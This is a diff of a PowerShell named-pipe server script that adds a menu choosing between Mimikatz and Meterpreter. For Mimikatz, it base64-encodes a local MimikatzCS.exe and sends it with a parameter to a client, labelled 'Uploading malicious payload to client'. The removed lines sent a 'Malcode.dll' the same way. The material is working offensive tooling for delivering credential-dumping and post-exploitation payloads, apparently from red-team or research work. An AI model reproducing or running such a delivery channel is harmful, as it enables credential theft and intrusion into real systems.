@@ -1,4 +1,4 @@
-﻿function ReadMsg([System.IO.StreamReader]$StreamReader){
+function ReadMsg([System.IO.StreamReader]$StreamReader){
     $msg = $StreamReader.ReadLine()
     Write-Host $msg
 }
@@ -37,13 +37,28 @@ try{
 
         elseif ($action -eq 2){
             $sw.WriteLine("action=2")
+            $script_action = Read-Host "
+            1.Mimikatz
+            2.Meterpreter
+"
+            
             Write-Host "Uploading malicious payload to client"
-            $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\YahudScript\Malcode\Malcode.dll'
-            $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
-            $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
-            $sw.WriteLine($assemblyString) # Server sending to the client
-            [String]$parameter = Read-Host "Enter Parameter"
-            $sw.WriteLine($parameter) # Sending parameter to the client
+
+            if ($script_action -eq 1){
+                $sw.WriteLine("Mimikatz")
+                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\YahudScript\MimikatzLoader\MimikatzCS.exe'
+                $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+                $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
+                $sw.WriteLine($assemblyString) # Server sending to the client
+                [String]$parameter = Read-Host "Enter Parameter"
+                $sw.WriteLine($parameter) # Sending parameter to the client
+                $sw.Dispose()
+                $pipeServer.Dispose()
+            }
+
+            else {
+                $sw.WriteLine("Meterpreter")
+            }
 
         }
 
